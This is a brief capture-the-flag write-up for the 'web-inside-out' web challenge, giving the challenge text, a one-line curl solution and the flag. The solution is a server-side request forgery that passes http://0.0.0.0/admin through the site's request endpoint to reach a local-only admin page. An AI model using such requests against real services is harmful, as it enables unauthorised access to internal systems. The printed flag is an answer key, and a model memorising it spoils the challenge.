#### Challenge:

You're hot then you're cold.

You're yes then you're no.

You're out but somehow in... 

Wait is that right?

[web-inside-out](https://web-inside-out-b3d9f3b9.chal-2021.duc.tf/)

---

#### Solution:

- inspecting the source reveals that `/admin` page exists, however it's restricted only to local network

```bash
curl 'https://web-inside-out-b3d9f3b9.chal-2021.duc.tf/request?url=http://0.0.0.0/admin' | jq .text
```

---

<details><summary>FLAG:</summary>

```
DUCTF{very_spooky_request}
```

</details>
<br/>
